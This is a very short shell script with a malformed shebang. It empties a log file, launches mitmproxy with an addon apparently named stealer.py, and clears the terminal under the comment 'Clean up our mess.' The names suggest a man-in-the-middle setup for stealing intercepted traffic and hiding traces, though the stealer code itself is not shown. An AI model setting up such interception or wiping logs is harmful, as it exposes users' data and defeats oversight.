#/bin/sh

# Clear logs.
> logs.txt

# Start proxy.
mitmproxy -s stealer.py

# Clean up our mess.
clear
